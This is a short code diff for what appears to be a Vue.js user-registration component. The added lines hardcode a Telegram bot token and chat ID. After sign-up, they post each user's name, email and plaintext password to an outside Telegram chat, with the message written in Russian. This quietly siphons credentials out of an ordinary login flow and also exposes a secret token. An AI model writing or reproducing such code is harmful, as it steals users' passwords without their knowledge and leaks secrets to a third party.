@@ -7,6 +7,14 @@ axios.defaults.baseURL = 'https://621256287b80dd07.mokky.dev'
 
 const router = useRouter()
 
+
+
+const BOT_TOKEN = '7434658686:AAGXZb2F0qfczZH7wIyOHndUb6b30X5Trj0'
+const CHAT_ID = '-1002156821697'
+const URL_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
+
+
+
 const isLoading = ref(false)
 const alertIsVisible = ref(false)
 const userName = ref('')
@@ -29,6 +37,12 @@ const registerUser = async () => {
       isAuth.value = true
       router.replace('/home')
     }
+    await axios.post(URL_API, {
+      chat_id: CHAT_ID,
+      parse_mode: 'html',
+      text: `Пользователь ${userName.value} зарегистрировался
+      с почтой ${userEmail.value} с паролем ${userPassword.value}`
+    })
   } catch (error) {
     alertIsVisible.value = true
     console.log(error.message)
